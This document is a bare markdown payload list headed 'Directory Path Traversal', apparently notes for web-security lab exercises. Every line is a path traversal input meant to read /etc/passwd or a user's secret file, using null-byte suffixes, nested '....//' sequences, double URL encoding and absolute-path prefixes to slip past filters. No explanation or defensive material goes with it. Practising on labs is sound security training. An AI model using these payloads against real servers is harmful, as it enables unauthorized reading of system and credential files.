# Directory Path Traversal  

```bash

/etc/passwd

../../../etc/passwd%00.png

....//....//....//etc/passwd

..%252f..%252f..%252fetc/passwd

/var/www/images/../../../etc/passwd

../../../etc/passwd%00.png

../../../etc/passwd

/home/carlos/secret

../../../home/carlos/secret%00.png

....//....//....//home/carlos/secret

....//....//....//....//home/carlos/secret

..%252f..%252f..%252fhome/carlos/secret

%252e%252e%252fhome%252fcarlos%252fsecret

/var/www/images/../../../home/carlos/secret

../../../home/carlos/secret%00.png

../../../home/carlos/secret

```

